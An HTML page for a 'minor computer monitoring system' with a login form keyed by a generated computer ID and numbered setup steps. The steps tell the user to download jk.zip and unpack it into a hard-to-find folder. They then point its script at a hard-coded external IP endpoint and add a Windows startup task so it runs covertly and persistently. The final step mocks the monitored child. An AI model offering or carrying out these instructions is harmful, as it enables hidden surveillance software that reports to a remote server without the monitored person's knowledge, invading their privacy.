<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Welcome to CodeIgniter</title>

	<style type="text/css">

	::selection { background-color: #f07746; color: #fff; }
	::-moz-selection { background-color: #f07746; color: #fff; }

	body {
		background-color: #fff;
		margin: 40px auto;
		max-width: 1024px;
		font: 16px/24px normal "Helvetica Neue",Helvetica,Arial,sans-serif;
		color: #808080;
	}

	a {
		color: #dd4814;
		background-color: transparent;
		font-weight: normal;
		text-decoration: none;
	}

	a:hover {
		color: #97310e;
	}

	h1 {
		color: #fff;
		background-color: #dd4814;
		border-bottom: 1px solid #d0d0d0;
		font-size: 22px;
		font-weight: bold;
		margin: 0 0 14px 0;
		padding: 5px 10px;
		line-height: 40px;
	}

	h1 img {
		display: block;
	}

	h2 {
		color:#404040;
		margin:0;
		padding:0 0 10px 0;
	}

	code {
		font-family: Consolas, Monaco, Courier New, Courier, monospace;
		font-size: 13px;
		background-color: #f5f5f5;
		border: 1px solid #e3e3e3;
		border-radius: 4px;
		color: #002166;
		display: block;
		margin: 14px 0 14px 0;
		padding: 12px 10px 12px 10px;
	}

	#body {
		margin: 0 15px 0 15px;
		min-height: 96px;
	}

	p {
		margin: 0 0 10px;
		padding:0;
	}

	p.footer {
		text-align: right;
		font-size: 12px;
		border-top: 1px solid #d0d0d0;
		line-height: 32px;
		padding: 0 10px 0 10px;
		margin: 20px 0 0 0;
		background:#8ba8af;
		color:#fff;
	}

	#container {
		margin: 10px;
		border: 1px solid #d0d0d0;
		box-shadow: 0 0 8px #d0d0d0;
		border-radius: 4px;
	}
	</style>
</head>
<body>
	<div id="container">
		<h1>
			未成年电脑监控系统
		</h1>
		<div id="body">
			<form action="jz.php" method="get">
				<div style="">
					输入电脑编号登录: <input type="text" name="sn" />
					<input type="submit" value="登录" />
				</div>
				<br />
				<script>
					function randomString(len) {
						 　　len = len || 32;
						 　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
						 　　var maxPos = $chars.length;
						 　　var pwd = '';
						 　　for (i = 0; i < len; i++) {
							 　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
							 　　}
						 　　return pwd;
					};
					function gen_sn(){
						var rand_str = randomString(32);
						var sn_copy = document.getElementById('sn_copy');
						sn_copy.innerText = rand_str;
						document.getElementById('gen_sn').style.display = 'block';
					}
				</script>
				没有电脑编号？<button type="button" onclick="gen_sn()">点我接入电脑</button>
				<div id="gen_sn" style="display: none;">
					<p>1. 你的电脑编号为（请复制保存）：<span id="sn_copy"></span></p>
					<p>2. 点我下载电脑接入程序：<a href="jk.zip">jk.zip</a></p>
                    <p>3. 把jk.zip解压到一个不容易发现的文件夹，修改jk.php中的“http://120.24.87.76/hz.php?sn=xxxx”的xxxx改成你的电脑编号</p>
                    <p>4. 在win10中打开“任务计划任务”-》“创建基本任务”-》“触发器”-》“计算机启动时”-》“操作”——》“启动程序”-》“程序或脚本”-》“path\to\php.php”-》“添加参数”-》“jk.php”-》“起始于”-》“path\to”-》“完成”</p>
                    <p>5. 那一天小朋友终于想起被大人支配的恐惧</p>
				</div>
			</form>
		<p class="footer">Page rendered in <strong>0.0158</strong> seconds. CodeIgniter Version <strong>3.2.0-dev</strong></p>
	</div>
</body>
</html>
